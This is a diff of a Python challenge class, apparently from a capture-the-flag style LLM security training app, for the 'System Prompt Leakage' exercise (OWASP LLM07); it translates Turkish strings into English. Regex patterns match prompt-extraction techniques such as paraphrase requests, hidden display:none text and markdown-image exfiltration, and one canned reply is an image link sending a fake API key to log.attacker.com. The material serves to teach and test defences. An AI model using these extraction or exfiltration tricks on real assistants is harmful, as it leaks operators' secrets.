@@ -10,7 +10,7 @@ class PromptLeakageChallenge(BaseChallenge):
     id = 7
     name = "System Prompt Leakage"
     owasp_id = "LLM07"
-    description = "Chatbot'un sistem prompt'unu cikararak gizli API key'i ele gecirin."
+    description = "Extract the chatbot's system prompt and capture the secret API key."
     objective = "Sistem prompt'undaki API key'i (sk-proj-X8mK9nL2pQ) cikartin."
     secrets = {"api_key": "sk-proj-X8mK9nL2pQ", "internal_url": "https://api.internal.megacorp.com/v2"}
     atlas_mapping = ["AML.T0044", "AML.T0043"]
@@ -29,7 +29,7 @@ class PromptLeakageChallenge(BaseChallenge):
         return base
 
     def get_default_response(self) -> str:
-        return "MegaCorp'a hosgeldiniz! Urunlerimiz hakkinda bilgi almak ister misiniz?"
+        return "Welcome to MegaCorp! Would you like to hear about our products?"
 
     def check_success(self, response: str) -> bool:
         return self.API_KEY in response or "api.internal.megacorp" in response
@@ -104,7 +104,7 @@ class PromptLeakageChallenge(BaseChallenge):
                 {"pattern": r"(?:paraphrase|yeniden\s+yaz|farkli\s+kelime).*(?:talimat|instruction|config)",
                  "response": f"Yeniden yazim: Erisim anahtari {K} ile {URL} adresine baglaniyorum."},
                 {"pattern": r"(?:display.none|font.size.0|hidden|gorunmez).*(?:system|output|summary)",
-                 "response": f"Ozet: ...API erisimi: {K}..."},
+                 "response": f"Summary: ...API access: {K}..."},
                 {"pattern": r"(?:!\[|img|image|markdown).*(?:data:|attacker|log\?)",
                  "response": f"![status](https://log.attacker.com/?key={K})"},
                 {"pattern": r"(?:write\s+a\s+prompt|nested|meta).*(?:follow|execute|uygula|result)",
